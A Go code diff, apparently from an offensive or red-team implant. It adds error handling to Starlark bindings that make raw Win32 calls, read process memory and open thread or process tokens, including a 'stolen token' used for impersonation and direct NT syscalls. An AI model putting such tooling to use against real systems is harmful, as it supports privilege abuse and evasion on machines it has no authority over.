@@ -98,10 +98,15 @@ func starlarkWinCall(thread *starlark.Thread, fn *starlark.Builtin, args starlar
 	var callErr error
 
 	// Run the Win32 call under impersonation if a token is set.
-	_ = runWithToken(thread, func() error {
+	if err := runWithToken(thread, func() error {
 		r1, r2, callErr = proc.Call(uintptrArgs...)
 		return nil
-	})
+	}); err != nil {
+		// Impersonation failed — still call the API (as process identity)
+		// but let the script know via the error key.
+		thread.Print(thread, fmt.Sprintf("win_call: impersonation failed: %v", err))
+		r1, r2, callErr = proc.Call(uintptrArgs...)
+	}
 	_ = keepAlive
 
 	dict := starlark.NewDict(4)
@@ -184,10 +189,13 @@ func starlarkWinReadMem(thread *starlark.Thread, fn *starlark.Builtin, args star
 	buf := make([]byte, size)
 	var bytesRead uintptr
 	var rpmErr error
-	_ = runWithToken(thread, func() error {
+	if err := runWithToken(thread, func() error {
 		rpmErr = windows.ReadProcessMemory(windows.CurrentProcess(), uintptr(addr), &buf[0], uintptr(size), &bytesRead)
 		return nil
-	})
+	}); err != nil {
+		thread.Print(thread, fmt.Sprintf("win_read_mem: impersonation failed: %v", err))
+		rpmErr = windows.ReadProcessMemory(windows.CurrentProcess(), uintptr(addr), &buf[0], uintptr(size), &bytesRead)
+	}
 	if rpmErr != nil || bytesRead == 0 {
 		return starlark.None, fmt.Errorf("win_read_mem: unallocated or invalid memory address 0x%x", addr)
 	}
@@ -241,7 +249,7 @@ func starlarkCurrentToken(thread *starlark.Thread, fn *starlark.Builtin, args st
 	// No stolen token active — open the thread token (may be the process
 	// identity if not impersonating, or fail if no thread token).
 	var hToken windows.Handle
-	_ = runWithToken(thread, func() error {
+	if err := runWithToken(thread, func() error {
 		h, status, err := syscall.NtOpenThreadToken(
 			syscall.RuntimeSyscallTable,
 			windows.CurrentThread(),
@@ -252,14 +260,16 @@ func starlarkCurrentToken(thread *starlark.Thread, fn *starlark.Builtin, args st
 			hToken = h
 		}
 		return nil
-	})
+	}); err != nil {
+		thread.Print(thread, fmt.Sprintf("current_token: NtOpenThreadToken: %v", err))
+	}
 	if hToken != 0 {
 		return starlark.MakeUint64(uint64(hToken)), nil
 	}
 
 	// Fall back to process token.
 	var hProcToken windows.Handle
-	_ = runWithToken(thread, func() error {
+	if err := runWithToken(thread, func() error {
 		h, status, err := syscall.NtOpenProcessToken(
 			syscall.RuntimeSyscallTable,
 			windows.CurrentProcess(),
@@ -269,7 +279,9 @@ func starlarkCurrentToken(thread *starlark.Thread, fn *starlark.Builtin, args st
 			hProcToken = h
 		}
 		return nil
-	})
+	}); err != nil {
+		thread.Print(thread, fmt.Sprintf("current_token: NtOpenProcessToken: %v", err))
+	}
 	if hProcToken != 0 {
 		return starlark.MakeUint64(uint64(hProcToken)), nil
 	}
